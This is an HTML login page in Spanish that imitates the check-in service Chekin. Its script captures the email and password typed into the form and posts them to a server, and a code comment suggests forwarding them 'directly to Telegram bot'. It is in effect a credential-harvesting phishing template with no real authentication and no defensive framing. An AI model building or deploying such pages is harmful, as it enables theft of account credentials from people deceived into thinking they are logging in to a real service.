<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Chekin - Login</title>
    <link rel="stylesheet" href="https://your-cdn-path.com/your-style.css"> <!-- Replace with your custom CSS -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        .login-container h1 {
            text-align: center;
            color: #3a3a3a;
        }

        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            border: 1px solid #ccc;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #45a049;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <h1>Bienvenido de vuelta!</h1>
        <form id="login-form">
            <div class="form-group">
                <label for="erf_username">Email</label>
                <input type="text" id="erf_username" name="erf_username" required placeholder="Introduce tu email">
            </div>
            <div class="form-group">
                <label for="erf_password">Contraseña</label>
                <input type="password" id="erf_password" name="erf_password" required placeholder="Introduce tu contraseña">
            </div>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>

    <script>
        document.getElementById("login-form").addEventListener("submit", function (e) {
            e.preventDefault();

            const email = document.getElementById("erf_username").value;
            const password = document.getElementById("erf_password").value;

            // Send data to your server or directly to Telegram bot
            fetch('http://localhost:3000/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            })
            .then(response => response.text())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        });
</script>
</body>

</html>
